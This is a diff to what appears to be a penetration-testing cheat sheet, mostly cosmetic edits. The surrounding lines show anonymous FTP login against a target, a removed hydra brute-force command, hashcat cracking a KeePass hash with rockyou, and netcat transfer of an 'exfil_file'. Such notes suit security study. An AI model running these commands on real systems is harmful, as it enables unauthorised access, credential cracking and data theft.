@@ -30,6 +30,7 @@ machinename:machinename
 anonymous:anonymous
 ftp:ftp
 ```
+
 Anonymous login:
 ```
 ftp $rhosts
@@ -39,11 +40,6 @@ ftp $rhosts
 >binary #Set transmission to binary instead of ascii
 >ascii #Set transmission to ascii instead of binary
 >bye #exit
-```
-
-Bruteforce login attack:
-```
-hydra -L usersfile -P /path/to/passwordfile ftp://$rhosts [-s $rport]
 ```
 
 Download all files from ftp:
@@ -466,6 +462,7 @@ Windows:
 
 Credits:
 [PayloadsAllTheThings - File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
+
 [HTB Academy - File Inclusion](https://academy.hackthebox.com/course/preview/file-inclusion)
 
 |**Function**|**Read Content**|**Execute**|**Remote URL**|
@@ -1098,8 +1095,7 @@ NOTE! Remember to alter the hash file and delete everything before $keepass$...
 Crack it with hashcat
 ```
 hashcat -m 13400 keepass.hash
-/usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --
-force
+/usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
 ```
 
 Use this password with the GUI KeePass and extract the passwords from it.
@@ -1307,7 +1303,7 @@ Safely Moving a File Between Remote Hosts
 scp root@191.162.0.2:/writing/article/scp.zip hostinger@11.10.0.1:/publishing
 ```
 
-### NC
+### nc
 ```
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
